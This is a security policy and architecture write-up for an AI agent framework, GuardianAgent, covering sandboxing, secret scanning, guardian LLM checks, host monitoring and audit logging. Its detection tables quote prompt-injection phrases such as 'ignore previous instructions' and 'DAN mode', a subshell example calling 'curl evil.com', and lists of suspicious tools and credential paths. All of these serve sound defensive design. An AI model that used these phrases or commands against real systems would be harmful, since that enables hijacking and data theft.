# Security Policy

## Supported Versions

| Version | Supported |
|---------|-----------|
| 1.x     | Yes       |
| < 1.0   | No        |

## Reporting a Vulnerability

If you find a security issue, please open a GitHub issue or reach out via the repository contact. Including steps to reproduce and potential impact helps us triage faster. Even better — fix it and submit a pull request.

---

# Security Architecture

GuardianAgent implements a security-focused runtime architecture with mandatory enforcement on framework-managed agent flows. Guardian, ToolExecutor, wrapped LLM access, approvals, and subprocess sandboxing are structural parts of the runtime, not optional conventions.

GuardianAgent does **not** currently treat developer-authored agent code as untrusted code running in a separate supervisor-controlled sandbox. Agents run in the main Node.js process, and the strongest OS isolation available today applies to child processes launched through managed tool surfaces.

## Threat Model

GuardianAgent is an AI agent orchestration system where:

- **Agent code is trusted** — TypeScript classes written by the developer
- **LLM output is NOT trusted** — Models can hallucinate, leak secrets, or be prompt-injected
- **User input is NOT trusted** — External input may contain injection attempts

### Realistic Threats Addressed

| Threat | Mitigation |
|--------|-----------|
| Prompt injection | InputSanitizer with 18 weighted signal patterns |
| Credential leakage via LLM | OutputGuardian + GuardedLLMProvider (mandatory wrapping) |
| Unauthorized file access | Allowed path roots + denied-path patterns + path normalization on managed file/tool actions |
| Capability escalation | Frozen per-agent capability grants + Guardian checks on framework-managed actions |
| DoS via message flooding | Multi-scope sliding windows: per-agent + per-user + global |
| Secret exfiltration via events | Payload scanning on all inter-agent communication |
| Event source spoofing | Trusted source validation + Runtime-stamped `ctx.emit()` source IDs |
| Shell command injection | POSIX tokenizer with whitelist validation |
| LLM provider failures | CircuitBreaker + priority-based FailoverProvider |
| Malicious skill content | Local reviewed skill roots, no direct execution path, ToolExecutor/Guardian remain mandatory for effects |
| Over-broad external tool providers | Guardian policy, managed provider allowlists, per-service capabilities, audit trail |
| Dangerous tool actions | Guardian Agent inline LLM evaluation blocks high/critical risk actions before execution |
| Host-installed agent drift or suspicious local activity | Host monitor baselines suspicious processes, persistence, sensitive paths, and network deltas; critical findings can block risky actions |

---

## Four-Layer Defense System

GuardianAgent's security operates at every stage of the agent lifecycle through four independent defense layers.

```
┌─────────────────────────────────────────────────────────┐
│                    USER INPUT                           │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│  LAYER 1: Guardian Admission Pipeline (Proactive)       │
│                                                         │
│  ┌──────────────┐  ┌─────────────┐  ┌───────────────┐  │
│  │ InputSanitizer│→│ RateLimiter │→│ Capability    │  │
│  │ (mutating)   │  │ (validating)│  │ Controller    │  │
│  └──────────────┘  └─────────────┘  └───────────────┘  │
│         │                                    │          │
│         ▼                                    ▼          │
│  ┌──────────────┐  ┌─────────────┐  ┌───────────────┐  │
│  │ SecretScan   │→│ DeniedPath  │→│ ShellCommand  │  │
│  │ Controller   │  │ Controller  │  │ Controller    │  │
│  └──────────────┘  └─────────────┘  └───────────────┘  │
│                                                         │
│  Runs BEFORE agent.onMessage() — agent never sees       │
│  blocked input. Sync, rule-based, zero LLM calls.       │
└───────────────────────┬─────────────────────────────────┘
                        │ ✓ Allowed
                        ▼
┌─────────────────────────────────────────────────────────┐
│  AGENT EXECUTION                                        │
│                                                         │
│  Agent receives:                                        │
│  • ctx.llm = GuardedLLMProvider (NOT raw provider)      │
│  • ctx.emit() = scanned for secrets before dispatch     │
│  • ctx.capabilities = Object.freeze([...])              │
│  • ctx.checkAction() = Guardian policy check            │
│                                                         │
│  Agent does NOT have: ctx.fs, ctx.http, ctx.exec        │
│  by default. Runtime mediates framework-provided        │
│  interaction surfaces such as ctx.llm, ctx.emit(),      │
│  ctx.dispatch(), and managed tools.                     │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│  LAYER 1.5: OS-Level Process Sandbox                    │
│                                                         │
│  Current: bwrap namespace isolation on Linux             │
│  Current: sandbox health states; strict mode disables    │
│  risky subprocess-backed tools without a strong backend  │
│  Current default: strict enforcement mode                │
│  Current fallback: ulimit + env hardening                │
│  Next: native Windows/macOS sandbox helpers              │
│                                                         │
│  ┌──────────────┐  ┌─────────────┐  ┌───────────────┐  │
│  │ Filesystem   │  │ Network     │  │ Resource      │  │
│  │ Isolation    │  │ Namespace   │  │ Limits        │  │
│  │ (ro-bind)    │  │ (unshare)   │  │ (ulimit)      │  │
│  └──────────────┘  └─────────────┘  └───────────────┘  │
│                                                         │
│  Child processes run with namespace/resource isolation.  │
│  Write access is constrained by sandbox binds, network   │
│  is isolated by default, and resource quotas are         │
│  enforced when supported by platform capabilities.       │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│  LAYER 2: Guardian Agent (Inline LLM Evaluation)        │
│                                                         │
│  The namesake feature. Evaluates tool actions via LLM   │
│  BEFORE execution. Can deny risky or malicious actions.  │
│                                                         │
│  • Runs on non-read-only tool actions (mutating,        │
│    network, external_post)                              │
│  • Uses dedicated security prompt — no SOUL/skills      │
│  • Configurable LLM: local (Ollama), external           │
│    (OpenAI/Anthropic), or auto (local-first fallback)   │
│  • Fail-closed by default (action blocked if LLM is     │
│    unavailable or times out; configurable: failOpen)    │
│  • All evaluations logged to audit trail with           │
│    controller='GuardianAgent'                           │
│  • Risk levels: safe, low, medium (allow), high,        │
│    critical (block)                                     │
└───────────────────────┬─────────────────────────────────┘
                        │ ✓ Allowed
                        ▼
┌─────────────────────────────────────────────────────────┐
│  LAYER 3: Output Guardian (Reactive)                    │
│                                                         │
│  Scans agent response AFTER execution, BEFORE delivery  │
│                                                         │
│  • 30+ secret patterns (AWS, GCP, Azure, GitHub, etc.)  │
│  • Redact mode: replace secrets with [REDACTED]         │
│  • Block mode: return "[Response blocked]" entirely     │
│  • Event payloads also scanned before inter-agent send  │
│                                                         │
│  GuardedLLMProvider ensures EVERY ctx.llm call is       │
│  scanned before delivery                                │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│  LAYER 4: Sentinel Audit (Retrospective)                │
│                                                         │
│  Runs on cron schedule (default 5m) or on-demand via    │
│  web UI / API. Analyzes AuditLog for patterns:          │
│                                                         │
│  • Volume spikes (denial rate > 3x baseline)            │
│  • Capability probing (agent denied for 5+ actions)     │
│  • Repeated secret detection (3+ per agent)             │
│  • Error storms (>10 errors in window)                  │
│  • Optional LLM-enhanced analysis                       │
│  • Network baseline anomalies + traffic threat signals  │
│                                                         │
│  Available via POST /api/sentinel/audit and in the      │
│  web UI Settings > Sentinel Audit panel.                │
└─────────────────────────────────────────────────────────┘
```

---

## Framework Enforcement Points

The following controls are enforced at Runtime chokepoints for framework-managed flows. They are strong guarantees for `ctx.llm`, `ctx.emit()`, `ctx.dispatch()`, and managed tool execution. They are not a claim that arbitrary developer-authored agent code is confined in a separate sandboxed process.

| Chokepoint | Enforcement | Bypass Prevention |
|------------|-------------|-------------------|
| **Message input** | Guardian pipeline runs BEFORE `agent.onMessage()` | Agent never sees blocked messages |
| **Tool pre-execution** | Guardian Agent LLM evaluates action before tool handler runs | Risky actions blocked before any side effects |
| **Host self-policing** | Host monitor can block risky command/network actions when critical or stacked high-severity host alerts are active | High-risk follow-up actions require operator review after suspicious host activity |
| **Response output** | OutputGuardian scans after execution | Response modified before delivery |
| **LLM access** | `GuardedLLMProvider` wraps real provider for `ctx.llm` | Framework-managed LLM calls are scanned/redacted before delivery |
| **Event emission** | Runtime source validation + payload scanning before dispatch | `ctx.emit()` stamps source; untrusted source IDs rejected |
| **Process sandbox** | bwrap namespace / Windows helper / ulimit for managed child processes | Wrapped at exec/spawn call site |
| **Resource limits** | Budget/token/queue checks before invocation | Runtime rejects over-limit requests |
| **Lifecycle gating** | Dead/Errored/Stalled agents cannot receive work | `assertExecutable()` guard |
| **Context immutability** | `Object.freeze()` on agent contexts | Agents cannot modify capabilities |

---

## Sandbox Availability Model

GuardianAgent now classifies sandbox strength as `strong`, `degraded`, or `unavailable` and threads that state into tool registration, execution, and user-facing status surfaces.

### Current Behavior

- Linux with `bwrap` available is treated as `strong`
- Linux without `bwrap` degrades to `ulimit` or env hardening
- macOS currently reports `degraded`
- Windows reports `strong` only when a configured native helper is enabled and detected; otherwise it reports `unavailable`
- `assistant.tools.sandbox.enforcementMode` supports `permissive` and `strict`
- Current defaults are `policyMode: approve_by_policy` and `sandbox.enforcementMode: strict`
- In `permissive` mode, risky subprocess-backed tools remain available even when sandbox availability is not `strong`, but permissive mode must be explicitly enabled by the operator
- In `strict` mode, risky subprocess-backed tools are disabled unless sandbox availability is `strong`
- CLI startup warnings, tool listings, category views, web tool state, and tool execution denials surface the reason

### Risky Tool Classes Blocked In `strict`

- shell execution
- browser automation
- MCP server processes and their registered tools
- subprocess-backed search/indexing tools
- other broad host-access categories currently mapped as `network` and `system`

### Current Limitation

Windows strong mode now depends on shipping and enabling `guardian-sandbox-win.exe`. The helper launches subprocesses with AppContainer security capabilities for sandboxed profiles and always applies Job Object lifetime controls. macOS still needs a native strong-backend helper.

### Windows Backend Status

Implemented in the current helper path:

- AppContainer-backed process launch for sandboxed profiles (`read-only`, `workspace-write`)
- Job Object `KILL_ON_JOB_CLOSE` enforcement for child process trees
- strict-mode fail-closed behavior when the helper is missing/unhealthy

Still pending for a fuller Windows backend:

- restricted-token layering in addition to AppContainer
- explicit process mitigation policy wiring
- first-class ACL automation for allowed path grants

### Optional Windows Portable Isolation Mode

GuardianAgent can also offer this as an **additional Windows option** via a portable zip bundle rather than a traditional installer.

Shape:

- `guardian-runtime.exe`
- `guardian-sandbox-win.exe`
- optional localhost-served or hosted web UI

Packaging model:

- one staged Windows app payload
- one portable zip can include both the runtime and sandbox helper
- installer generation is optional and can reuse the same staged payload

Security implications:

- this avoids installer packaging, but not the use of unsigned native binaries
- Windows users may still see reputation or trust prompts for unsigned executables
- strong Windows sandbox availability still depends on the helper being present, enabled, and healthy
- the same helper path can be shipped either through the optional portable zip bundle or the Windows installer packaging flow in `packaging/windows/`

Example config:

```yaml
assistant:
  tools:
    sandbox:
      enabled: true
      enforcementMode: strict
      windowsHelper:
        enabled: true
        command: ./bin/guardian-sandbox-win.exe
        timeoutMs: 5000
```

See `docs/proposals/WINDOWS-PORTABLE-ISOLATION-OPTION.md`.

### Filesystem and Network Expectations

- Filesystem enforcement on Windows should prefer isolated workspaces and explicit allowed-directory grants
- Network enforcement should support at least `on/off` at the sandbox boundary
- Fine-grained host/domain egress policy remains an application-layer control unless a future privileged Windows networking helper is introduced

---

## Host Workstation Monitoring

GuardianAgent now includes a practical host-monitoring layer intended for direct host installs where there is no Docker or VM boundary. The current implementation is Windows-first in threat model and process naming, while still shipping portable coverage for Linux and macOS.

### Current Signals

- suspicious process detection
  - Windows-focused high-risk names such as `wscript.exe`, `mshta.exe`, `rundll32.exe`, `regsvr32.exe`, `bitsadmin.exe`, and `certutil.exe`
  - portable checks for `osascript`, `launchctl`, `socat`, and `nc`
- persistence drift
  - Windows Run/RunOnce keys, scheduled tasks, and Startup folders
  - Linux autostart, `systemd`, and `crontab`
  - macOS LaunchAgents, LaunchDaemons, and `crontab`
- sensitive path drift
  - GuardianAgent state, SSH, cloud credentials, kube config, shell profiles, and PowerShell profiles
- network drift
  - new external destinations
  - new listening ports, with high-risk ports elevated
- firewall posture
  - Windows Defender Firewall profile state and rule drift
  - Linux `ufw` state or `nftables`/`iptables` ruleset drift
  - macOS `pf` state and ruleset drift

### Self-Policing Behavior

Host monitoring is not only informational. It participates in execution control:

- critical host alerts can block risky follow-up actions such as command execution and outbound/network actions
- multiple active high-severity host alerts can also force operator review before sensitive execution continues
- denials are written to the audit log as `action_denied` with `controller: HostMonitor`

This means GuardianAgent can police itself when the local machine starts showing behavior that looks inconsistent with the intended operating posture.

### Operator Surfaces

- audit event type: `host_alert`
- notification fanout: web, CLI, Telegram via the notification service
- Security page:
  - host monitor posture cards
  - active host alerts table
  - manual check trigger
  - acknowledgement flow
- tools:
  - `host_monitor_status`
  - `host_monitor_check`

### Current Limitations

- this is a practical first-pass monitor, not EDR-grade telemetry
- file drift on sensitive directories is metadata-based rather than full content inspection
- Windows helper-backed deep process/file correlation is still future work
- Linux `auditd`/eBPF and macOS EndpointSecurity-class telemetry remain future optional depth layers

---

## Native Skills Security Model

GuardianAgent now has a native skills foundation. Skills are a **knowledge and workflow layer**, not a privileged execution layer.

### Security Requirements for Skills

- Skills are loaded from configured local roots by default
- Skills do not create or bypass tools
- Skills do not grant capabilities
- Skills may recommend actions, but execution still goes through ToolExecutor and Guardian
- Any future install/setup steps must be explicitly approval-gated

This separation is deliberate: skills help the model plan, while tools and MCP integrations remain the only execution surfaces.

---

## Managed Google Workspace Integration

GuardianAgent integrates with Google Workspace (Gmail, Calendar, Drive, Docs, Sheets) via the Google Workspace CLI (`@googleworkspace/cli`) running as a managed MCP server, plus curated native skills.

### Installation Model

- The GWS CLI is **not bundled** — users install it separately (`npm install -g @googleworkspace/cli`)
- OAuth 2.0 credentials must be configured per-user via Google Cloud Console (Desktop app client type) or `gcloud` CLI
- Authentication requires an interactive browser OAuth flow (`gws auth login`) — cannot be initiated headlessly from the web UI or API
- Credentials are stored in the OS keyring by `gws`, not by GuardianAgent

### Security Expectations

- Only configured Google services are exposed (opt-in via `services` array)
- Gmail, Calendar, Drive, Docs, and Sheets capability hooks exist in Guardian for managed Google tooling
- External send/post actions (e.g. `gmail_send`) remain approval-gated (`external_post` risk)
- Read-only Google actions follow the configured tool policy mode
- The `SecretScanController` exempts email addresses only in addressing fields (`to`, `from`, `cc`, `bcc`, etc.) for email/calendar/MCP tool actions — email addresses in message bodies or other fields are still flagged as PII
- Provider-managed secure storage (OS keyring) is used for credentials — GuardianAgent never stores or handles raw OAuth tokens

### Web UI Controls

- Settings > Google Workspace panel provides connectivity testing, service selection, and one-click provider enable
- Enabling the provider writes `mcp.enabled: true` and `managedProviders.gws` to config — a restart is required for the MCP server to start

See:

- `docs/specs/SKILLS-SPEC.md`
- `docs/specs/GOOGLE-WORKSPACE-INTEGRATION-SPEC.md`

---

## Secret Detection

Secret scanning is applied to **all string fields** in action params (recursive traversal), not just `content`.

### Built-in Patterns (30+)

| Category | Patterns Detected |
|----------|------------------|
| **AWS** | Access Key (`AKIA...`), Secret Key, Session Token |
| **GCP / Google** | Service Account JSON, AI API Key (`AIza...`) |
| **Azure** | Storage Account Key (connection string) |
| **GitHub** | PAT (`ghp_`), OAuth (`gho_`), App Token (`ghs_`, `ghr_`) |
| **GitLab** | PAT (`glpat-`), Pipeline Token (`glptt-`) |
| **OpenAI** | API Key (`sk-proj-`, `sk-...`) |
| **Anthropic** | API Key (`sk-ant-...`) |
| **Stripe** | Live Key (`sk_live_`), Test Key (`sk_test_`) |
| **Slack** | Bot Token (`xoxb-`), Webhook URL |
| **Twilio** | API Key (`SK` + 32 hex) |
| **SendGrid** | API Key (`SG.<22>.<43>`) |
| **Telegram** | Bot Token |
| **npm** | Token (`npm_`) |
| **Infrastructure** | Heroku API Key, Mailgun Key |
| **Tokens/Certs** | JWT (`eyJ...`), PEM Private Key headers, Connection Strings |
| **PII** | Email addresses, US SSN, Credit Card numbers, US Phone numbers |
| **Generic** | `password=`, `api_key=`, `secret=`, `token=` patterns |

### PII Field-Level Exemptions

Email addresses are PII and are flagged by default in all params. However, email/calendar/MCP tool actions require email addresses in addressing fields to function. The `SecretScanController` applies a **narrow, field-scoped exemption**:

- **Only** the `Email Address` pattern is exempted
- **Only** in structurally required addressing fields: `to`, `from`, `cc`, `bcc`, `sender`, `recipient`, `recipients`, `attendees`, `organizer`, `replyTo`, `reply_to`
- **Only** for action types where addressing is expected: `send_email`, `draft_email`, `read_email`, `read_calendar`, `write_calendar`, `mcp_tool`
- Email addresses in **any other field** (e.g. `body`, `description`, `notes`, `content`) are **still flagged** as PII, even for exempt action types
- All other PII patterns (SSN, credit cards, phone numbers) are **never** exempted
- All credential patterns (API keys, tokens, secrets) are **never** exempted regardless of field or action type

This prevents false denials when sending email to a recipient while preserving PII detection everywhere else.

### Denied File Paths (15 patterns)

`.env`, `*.pem`, `*.key`, `credentials.*`, `id_rsa*`, SSH keys, `*.p12`/`*.pfx`, `*.jks`, `.npmrc`, `*.tfvars`, `*.tfstate`, `docker-compose*.yml`, `.aws/credentials`, `.docker/config.json`, `kubeconfig`

---

## Prompt Injection Defense

The InputSanitizer operates as a mutating admission controller with two defenses:

### 1. Invisible Character Stripping

Removes Unicode characters that can hide instructions:
- Zero-width joiners/spaces (U+200B–200F)
- Bidi markers (U+202A–202E)
- Word joiners, isolate markers (U+2060–2069)
- BOM (U+FEFF), soft hyphens (U+00AD)

### 2. Injection Signal Detection (18 patterns)

| Category | Examples | Score |
|----------|----------|-------|
| Role override | "ignore previous instructions", "you are now" | 2–3 |
| Delimiter injection | `system:`, `assistant:`, code fence system | 1–3 |
| Instruction override | "new instructions:", "override all settings" | 3 |
| Jailbreak | "DAN mode", "developer mode" | 2–3 |
| Data exfiltration | "repeat all above", "show your prompt" | 2 |

Scores are additive. Default block threshold: **3** (configurable).

Detection is run against both raw and normalized text. Normalization includes NFKC Unicode normalization, leetspeak canonicalization (`1`→`i`, `0`→`o`, etc.), and separator de-obfuscation (for cases like `ig-nore previous instructions`).

---

## Per-Agent Capability Model

Capabilities are granted per-agent at registration and **frozen** (`Object.freeze`). Framework-managed actions must pass Guardian checks using those grants. This is an application-layer least-privilege model, not a kernel-mediated dynamic capability broker.

### Available Capabilities

| Capability | Grants Access To |
|-----------|-----------------|
| `read_files` | File read operations |
| `write_files` | File write/create operations |
| `execute_commands` | Shell command execution |
| `network_access` | HTTP requests to allowed domains |
| `read_email` | Email inbox access |
| `draft_email` | Email composition |
| `send_email` | Email sending |
| `read_calendar` | Calendar read access |
| `write_calendar` | Calendar event creation/modification |
| `read_drive` | Google Drive read access |
| `write_drive` | Google Drive file creation/modification |
| `read_docs` | Google Docs read access |
| `write_docs` | Google Docs creation/modification |
| `read_sheets` | Google Sheets read access |
| `write_sheets` | Google Sheets creation/modification |
| `git_operations` | Git commands |
| `install_packages` | Package installation |

### Trust Presets

One-knob security posture configuration:

| Preset | Capabilities | Rate Limit | Budget | Tool Policy |
|--------|-------------|------------|--------|-------------|
| **locked** | read_files only | 10/min, 100/hr | 15s | approve_each |
| **safe** | read_files, read_email | 20/min, 300/hr | 30s | approve_by_policy |
| **balanced** | read/write/exec/git/email | 30/min, 500/hr | 60s | approve_by_policy |
| **power** | all capabilities | 60/min, 2000/hr | 300s | autonomous |

Current defaults align most closely with the `balanced` posture for tool policy behavior: mutating and external-post actions require approval, while read-only and network tools are allowed by policy unless overridden.

---

## Tool Execution Security

### Three-Tier Approval Policy

| Mode | Behavior |
|------|----------|
| `approve_each` | Every tool call requires explicit user approval |
| `approve_by_policy` | Per-tool overrides: `auto`, `policy`, `manual`, `deny`; read-only and network tools are allowed by default |
| `autonomous` | Tools execute without approval (still sandboxed) |

### Policy-as-Code Engine

The policy engine replaces hard-coded `decide()` logic with declarative JSON rules that are version-controlled, auditable, and hot-reloadable.

**Architecture:**
- **Rule files** in `policies/` are loaded at startup and compiled into priority-sorted matcher closures
- **Canonical PolicyInput** model: `{ family, principal, action, resource, context }` — resource is always the tool; targets go in `resource.attrs`
- **Deterministic evaluation**: first-match wins, with family defaults as fallback (tool→mode-dependent, guardian/admin/event→deny)
- **10 match primitives**: exact, `in`/`notIn`, `gt`/`gte`/`lt`/`lte`, `startsWith`/`endsWith`, `regex`, `exists`
- **Compound conditions**: `allOf` (implicit default) and `anyOf` for disjunctive logic

**Operating modes:**

| Mode | Behavior |
|------|----------|
| `off` | Engine disabled, legacy `decide()` only |
| `shadow` | Engine runs alongside legacy; mismatches logged but legacy decision used (default) |
| `enforce` | Engine's decision is authoritative; legacy path disabled |

**Shadow mode safety:**
- Mismatches classified as `policy_too_strict`, `policy_too_permissive`, `normalization_bug`, or `legacy_bug`
- Log throttling after configurable limit (default 1000)
- Match rate and mismatch-by-class stats available via API
- 14-day exit criteria: 99%+ match rate, zero `policy_too_permissive` mismatches

**Schema versioning:** Files include `schemaVersion` field; engine rejects files with a newer version than supported, preventing accidental deployment of incompatible rules.

**Fail-safe behavior:**
- Shadow mode: engine error → log + continue with legacy decision
- Enforce mode: engine error → fail closed (deny)

### Risk Classification

| Risk Level | Examples |
|-----------|---------|
| `read_only` | File reads, searches |
| `mutating` | File writes, deletes |
| `network` | HTTP requests, downloads |
| `external_post` | Sending emails, posting to forums |

### Sandbox Restrictions

- **Path whitelist**: Tools can only access configured filesystem roots
- **Command whitelist**: Shell execution limited to explicitly allowed commands
- **Domain whitelist**: Network requests limited to configured domains
- **Provider host checks**: `web_search` verifies required provider hosts are allowlisted before making requests
- **Dry-run mode**: Preview mutating operations without execution

### OS-Level Process Sandbox

Managed child processes spawned by tool execution are wrapped in OS-level isolation using [bubblewrap (bwrap)](https://github.com/containers/bubblewrap) on Linux, an optional native helper on Windows, and graceful fallback to `ulimit` + environment hardening when stronger backends are unavailable.

#### Sandbox Profiles

| Profile | Filesystem | Network | Use Case |
|---------|-----------|---------|----------|
| `read-only` | Root bind (read-only), `/tmp` writable | Isolated by default | System info, QMD search, network probes |
| `workspace-write` | Workspace writable, `.git`/`.env*` forced read-only | Isolated by default | `execute_command`, MCP servers, browser |
| `full-access` | No isolation (env hardening only) | Full access | Explicitly trusted operations |

#### Isolation Mechanisms

| Mechanism | Platform | What It Does |
|-----------|----------|-------------|
| **bwrap namespace** | Linux | PID/network namespace isolation, read-only root bind, protected paths |
| **ulimit** | POSIX | Memory (512MB), CPU (60s), file size (10MB) limits; optional process count |
| **Env hardening** | All | Strips loader/interpreter injection vars (`LD_PRELOAD`, `DYLD_*`, `NODE_OPTIONS`, `GIT_SSH_COMMAND`, `PYTHONPATH`, `RUBYLIB`, `PERL5LIB`, etc.) |
| **Symlink resolution** | All | `resolveAllowedPath` resolves symlinks via `fs.realpath()` before path checking |

#### Configuration

```yaml
assistant:
  tools:
    sandbox:
      enabled: true
      mode: workspace-write       # Default profile
      networkAccess: false         # Default: isolate network
      additionalWritePaths: []     # Extra writable paths
      additionalReadPaths: []      # Extra read-only paths
      resourceLimits:
        maxMemoryMb: 512
        maxCpuSeconds: 60
        maxFileSizeKb: 10240       # 10 MB
        maxProcesses: 0             # 0 = unlimited; bwrap PID namespace used instead
```

#### Fallback Behavior

When a strong sandbox backend is not available (macOS, Windows without helper, minimal Linux containers):
1. `ulimit` resource limits are applied as a shell prefix (POSIX only)
2. Dangerous environment variables are stripped from child processes
3. Filesystem namespace isolation is not available (path/domain/command policy still applies)
4. A warning is logged at startup

In `permissive` mode this is a degraded-but-usable posture. In `strict` mode, risky subprocess-backed tool categories are disabled until a strong backend is available.

Install bwrap on Debian/Ubuntu: `sudo apt install bubblewrap`

---

## Credential Handling

- GuardianAgent now supports runtime credential references for LLM and web-search providers via `assistant.credentials.refs`
- the preferred pattern is `credentialRef` → env-backed credential reference, rather than storing raw provider keys inline in provider/tool config
- inline `apiKey` fields remain supported as a backward-compatible fallback, but are no longer the preferred configuration path
- Approval records store redacted arguments and a deterministic hash (`argsHash`) rather than raw sensitive values
- current provider integrations still resolve concrete credential values inside the main runtime process when creating provider/tool clients
- Output scanning and denied-path controls reduce accidental exfiltration, but GuardianAgent does not currently guarantee that credentials never enter the main process address space
- Provider-managed secure storage is preferred for external integrations where available

Example preferred pattern:

```yaml
assistant:
  credentials:
    refs:
      llm.openai.primary:
        source: env
        env: OPENAI_API_KEY
      search.brave.primary:
        source: env
        env: BRAVE_API_KEY
  tools:
    webSearch:
      provider: brave
      braveCredentialRef: search.brave.primary

llm:
  openai:
    provider: openai
    model: gpt-4o
    credentialRef: llm.openai.primary
```

Current limitation:

- this is a credential reference and resolution layer, not yet a separate secret-broker process
- long-lived credentials are better isolated than before at config level, but not yet held outside the runtime boundary at execution time

---

## Browser-To-Localhost Attack Mitigations

GuardianAgent is hardened against the class of attacks where a malicious website attempts to drive a locally running agent over loopback HTTP/WebSocket interfaces.

Current mitigations:

- the web channel does not expose a WebSocket control plane; it uses authenticated HTTP APIs plus authenticated SSE
- localhost / loopback is **not** treated as trusted for API access; `/api/*` and `/sse` always require authentication
- when no web token is configured, GuardianAgent generates a secure random token for the current run rather than leaving the API open
- wildcard CORS (`'*'`) is rejected by configuration validation for the web channel
- browser session cookies are `HttpOnly` and `SameSite=Strict`, reducing cross-site request exposure
- repeated authentication failures are rate-limited and temporarily blocked to slow token brute force against the local API
- privileged state-changing operations such as auth reconfiguration, token reveal/rotation, connector changes, and factory reset require short-lived privileged tickets in addition to base authentication
- SSE does not accept query-string tokens

Residual risk:

- broad `allowedOrigins` settings weaken the browser boundary and should be kept narrow
- binding the web channel to non-loopback interfaces increases remote attack surface
- possession of a valid bearer token still grants access to the web API within the configured authorization model

---

## Tamper-Evident Audit Trail

### Hash-Chained JSONL

Every security event is persisted to `~/.guardianagent/audit/audit.jsonl` with SHA-256 hash chaining:

```
{ event: {...}, previousHash: "abc123...", hash: "def456..." }
```

Each entry's hash is computed over the event + previous hash, creating a **tamper-evident chain**. Any modification to historical entries breaks the chain.

### Chain Verification

```typescript
const result = await auditLog.verifyChain();
// { valid: true, totalEntries: 1523 }
```

Available via `GET /api/audit/verify` endpoint.

### Event Types (13)

| Event | Severity | Description |
|-------|----------|-------------|
| `action_denied` | warn | Guardian blocked an action |
| `action_allowed` | info | Action passed Guardian check |
| `secret_detected` | warn/critical | Secret found in content |
| `output_blocked` | warn | LLM response blocked entirely |
| `output_redacted` | warn | Secrets redacted from response |
| `event_blocked` | warn | Inter-agent event blocked |
| `input_sanitized` | info | Invisible chars stripped |
| `rate_limited` | warn | Rate limit triggered |
| `capability_probe` | warn | Agent probed beyond capabilities |
| `policy_changed` | info | Tool or Guardian policy modified |
| `anomaly_detected` | warn/critical | Sentinel detected anomaly |
| `agent_error` | warn | Agent execution error |
| `agent_stalled` | warn | Agent stall detected |

---

## Resource Governance

### Per-Agent Limits

| Resource | Default | Purpose |
|----------|---------|---------|
| `maxInvocationBudgetMs` | 300,000ms (5min) | Wall-clock timeout per invocation |
| `maxTokensPerMinute` | 0 (unlimited) | LLM token rate limiting |
| `maxConcurrentTools` | 0 (unlimited) | Parallel tool execution cap |
| `maxQueueDepth` | 1,000 | Event queue backpressure |

### Stall Detection & Recovery

- **Watchdog** monitors agent activity timestamps
- Stall threshold: configurable (default 180s)
- Error recovery: exponential backoff [30s, 1m, 5m, 15m, 60m]
- After the backoff schedule saturates, retries continue at max backoff (agent remains recoverable)

### LLM Resilience

- **CircuitBreaker**: Per-provider failure tracking (closed → open → half-open)
- **FailoverProvider**: Priority-based provider chain with automatic fallback
- Token usage tracked per-agent for rate limiting

---

## Shell Command Validation

The ShellCommandController goes beyond simple string matching:

1. **POSIX tokenizer** handles quoting (`echo "hello && world"` → one command)
2. **Chain splitting** on `&&`, `||`, `;`, `|` operators
3. **Each sub-command** validated against whitelist
4. **Redirect targets** (`> .env`) checked against denied paths
5. **Subshell detection** (`$(curl evil.com)`) → denied
6. **Deny by default** if parser can't fully understand the input

---

## Web Channel Security

| Feature | Implementation |
|---------|---------------|
| **Authentication** | Bearer token (required by default) |
| **Token rotation** | Optional auto-rotation on startup |
| **CORS** | Configurable allowed origins |
| **Request limits** | Configurable max body size (default 1MB) |
| **Auth modes** | `bearer_required` (only supported mode; other values are ignored and forced to `bearer_required`) |
| **SSE** | Real-time stream authenticated via session cookie or `Authorization` header (`?token=` is rejected) |

---

## Orchestration Security

Multi-agent orchestration (Sequential, Parallel, Loop agents) maintains security invariants:

- All sub-agent invocations go through `Runtime.dispatchMessage()`
- Each sub-agent call passes through the full Guardian admission pipeline
- Shared state between agents is scoped and cleaned between runs
- Orchestration agents receive `ctx.dispatch()` — a guarded wrapper, not raw runtime access

---

## Design Principles

### Meta's Rule of Two

An agent should satisfy **at most two** of:
1. Processing untrusted inputs (user content, web pages)
2. Accessing sensitive data (credentials, .env files)
3. Changing state / communicating externally (shell commands, API calls)

### Security by Construction vs Convention

| Approach | GuardianAgent | Typical Frameworks |
|----------|--------------|-------------------|
| Output scanning | **Mandatory** (GuardedLLMProvider) | Optional callback |
| Capability enforcement | **Frozen grants** (Object.freeze) | Runtime checks |
| Admission pipeline | **Inline in Runtime** | Plugin/middleware |
| Audit logging | **Automatic** for all security events | Manual instrumentation |
| Context isolation | **Object.freeze** on agent context | Documentation only |

---

## Configuration

All security features are configurable in `~/.guardianagent/config.yaml`:

```yaml
guardian:
  enabled: true
  logDenials: true
  trustPreset: balanced          # locked | safe | balanced | power

  inputSanitization:
    enabled: true
    blockThreshold: 3

  rateLimit:
    maxPerMinute: 30
    maxPerHour: 500
    burstAllowed: 5
    maxPerMinutePerUser: 30
    maxPerHourPerUser: 500
    maxGlobalPerMinute: 300
    maxGlobalPerHour: 5000

  outputScanning:
    enabled: true
    redactSecrets: true          # false = block entire response

  guardianAgent:
    enabled: true
    llmProvider: auto             # local | external | auto
    failOpen: false               # block actions when LLM unavailable (fail-closed)
    timeoutMs: 8000               # inline evaluation timeout

  sentinel:
    enabled: true
    schedule: '*/5 * * * *'

  auditLog:
    maxEvents: 10000
    persistenceEnabled: true
```

---

## Extensibility

### Custom Admission Controllers

```typescript
guardian.use({
  name: 'MyController',
  phase: 'validating',
  check: (action) => {
    if (action.params.blocked) {
      return { allowed: false, reason: 'Custom denial', controller: 'MyController' };
    }
    return null; // pass through
  },
});
```

### Custom Secret Patterns

```yaml
guardian:
  additionalSecretPatterns:
    - 'MYTOKEN_[A-Za-z0-9]{32}'
```

### Custom Denied Paths

```yaml
guardian:
  deniedPaths:
    - '\\.secrets$'
    - 'internal/keys/'
```
